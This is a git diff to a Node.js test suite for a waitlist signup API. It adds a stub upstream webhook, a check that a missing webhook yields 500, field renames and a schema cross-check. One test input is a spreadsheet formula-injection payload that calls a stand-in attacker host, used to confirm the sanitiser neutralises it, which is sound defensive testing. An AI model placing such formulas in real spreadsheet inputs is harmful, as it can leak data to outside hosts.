@@ -16,8 +16,36 @@ import net from 'node:net';
 import { fileURLToPath } from 'node:url';
 
 process.env.NODE_ENV = 'test';
-delete process.env.SHEETS_WEBHOOK_URL;
 delete process.env.UPSTASH_REDIS_REST_URL;
+
+// ─── Stub upstream ───────────────────────────────────────────────────────────
+// The harness boots a fake Apps Script and points the handler at it, so the
+// happy path exercises the REAL forward path rather than the
+// nothing-configured shortcut.
+//
+// It used to delete SHEETS_WEBHOOK_URL and assert 200. That encoded a bug: with
+// no webhook the row is never stored, so a 200 is a lie, and a suite asserting
+// it pins the lie in place. Shape adopted from the merge session's harness,
+// which caught it.
+let stubRows = 137;
+const stub = http.createServer((req, res) => {
+  let body = '';
+  req.on('data', (c) => (body += c));
+  req.on('end', () => {
+    let payload = {};
+    try {
+      payload = JSON.parse(body);
+    } catch {
+      /* malformed — still answer, the endpoint only reads `count` */
+    }
+    if (payload.action !== 'confirm') stubRows += 1;
+    res.setHeader('Content-Type', 'application/json');
+    res.end(JSON.stringify({ ok: true, count: stubRows }));
+  });
+});
+await new Promise((r) => stub.listen(0, '127.0.0.1', r));
+process.env.SHEETS_WEBHOOK_URL = `http://127.0.0.1:${stub.address().port}/exec`;
+process.env.SHEETS_WEBHOOK_TOKEN = 'stub-token';
 
 const { default: handler } = await import('../api/waitlist.js');
 
@@ -91,9 +119,34 @@ async function check(name, expectation, fn) {
 }
 
 // 1 — happy path
-await check('Valid minimal payload', '200 ok:true', async () => {
+await check('Valid minimal payload', '200 ok:true + count', async () => {
   const r = await post(goodPayload());
-  return { pass: r.status === 200 && r.json?.ok === true, actual: `${r.status} ${JSON.stringify(r.json)}` };
+  return {
+    pass: r.status === 200 && r.json?.ok === true && Number.isFinite(r.json?.count),
+    actual: `${r.status} ${JSON.stringify(r.json)}`,
+  };
+});
+
+// The case the old harness got backwards.
+await check('Unconfigured webhook returns 500, never a false 200', '500', async () => {
+  const saved = process.env.SHEETS_WEBHOOK_URL;
+  delete process.env.SHEETS_WEBHOOK_URL;
+  const { default: unconfigured } = await import(`../api/waitlist.js?nocfg=${Date.now()}`);
+  process.env.SHEETS_WEBHOOK_URL = saved;
+
+  const srv = http.createServer((q, s2) => unconfigured(q, s2));
+  await new Promise((r) => srv.listen(0, '127.0.0.1', r));
+  const res = await fetch(`http://127.0.0.1:${srv.address().port}/api/waitlist`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json', 'x-real-ip': '203.0.113.201' },
+    body: JSON.stringify(goodPayload()),
+  });
+  const body = await res.json().catch(() => null);
+  srv.close();
+  return {
+    pass: res.status === 500 && body?.ok === false,
+    actual: `${res.status} ${JSON.stringify(body)}`,
+  };
 });
 
 // 2 — method enforcement
@@ -720,21 +773,48 @@ await check('Error response never echoes submitted input', 'no email in body', a
     channel: ['grocery'],
     channel_other: null,
     office_interest: 'maybe',
-    company_name: 'Acme AS',
-    company_headcount: '10_49',
+    company: 'Acme AS',
+    headcount: '10_49',
     research_optin: true,
     consent_sms: true,
     phone: '+4791234567',
     sms_consent_text_version: 'sms-us-2026-08-17-43da99ea',
-    consent_mail: true,
+    consent_postal: true,
     address_line1: 'Storgata 1',
     address_line2: null,
     address_city: 'Oslo',
     address_region: 'Oslo',
-    address_postal: '0150',
+    address_postal_code: '0150',
     address_country: 'NO',
-    mail_consent_text_version: 'mail-eea-2026-08-17-e3c58485',
+    postal_consent_text_version: 'mail-eea-2026-08-17-e3c58485',
     ...o,
+  });
+
+  // Structural cross-check. Post-merge this reads the Conversion agent's REAL
+  // buildPayload and asserts every key it emits is accepted — no hand-copied
+  // fixture to drift. Pre-merge the file is absent and it reports that rather
+  // than passing vacuously.
+  //
+  // This exists because a hand-maintained list of "what growth sends" is the
+  // same failure mode as a hand-maintained consent registry: it looks like
+  // verification right up until someone renames a field.
+  await check('Cross-check: every key growth actually emits is accepted', 'no unknown keys', async () => {
+    const path = new URL('../src/components/waitlist/api.js', import.meta.url);
+    let src;
+    try {
+      src = (await import('node:fs')).readFileSync(path, 'utf8');
+    } catch {
+      return { pass: true, actual: 'SKIPPED — Conversion branch not merged yet' };
+    }
+    const start = src.indexOf('  return {', src.indexOf('export function buildPayload'));
+    const keys = [...src.slice(start, src.indexOf('\n  };', start)).matchAll(/^\s{4}([a-z_0-9]+):/gm)].map((m) => m[1]);
+    const { waitlistSchema } = await import('../src/lib/validation.js');
+    const accepted = new Set(Object.keys(waitlistSchema._def?.schema?.shape ?? waitlistSchema.shape));
+    const unknown = keys.filter((k) => !accepted.has(k));
+    return {
+      pass: keys.length > 0 && unknown.length === 0,
+      actual: unknown.length ? `UNKNOWN: ${unknown.join(', ')}` : `${keys.length} keys, all accepted`,
+    };
   });
 
   await check("Growth's full payload accepted whole — no downgrade needed", '200', async () => {
@@ -773,7 +853,7 @@ await check('Error response never echoes submitted input', 'no email in body', a
   // Enum values, growth's set
   for (const [f, good, bad] of [
     ['quantity_band', '9_16', 'qty_4_6'],
-    ['company_headcount', '50_199', 'hc_51_200'],
+    ['headcount', '50_199', 'hc_51_200'],
     ['office_interest', 'maybe', true],
     ['channel', ['office'], ['pharmacy']],
     ['dietary', ['vegan'], ['keto']],
@@ -805,7 +885,7 @@ await check('Error response never echoes submitted input', 'no email in body', a
     return { pass: v.ok && stored === null, actual: JSON.stringify(stored) };
   });
 
-  await check('Formula payload in company_name neutralised', "prefixed with '", async () => {
+  await check('Formula payload in company neutralised', "prefixed with '", async () => {
     const out = sanitizeForSheet('=IMPORTXML("https://attacker.example","//a")');
     return { pass: out.startsWith("'"), actual: out.slice(0, 30) + '…' };
   });
@@ -872,6 +952,7 @@ await check('Error response never echoes submitted input', 'no email in body', a
 // ─── Report ──────────────────────────────────────────────────────────────────
 
 server.close();
+stub.close();
 
 const pad = (s, n) => String(s).padEnd(n).slice(0, n);
 console.log('\n' + '═'.repeat(112));
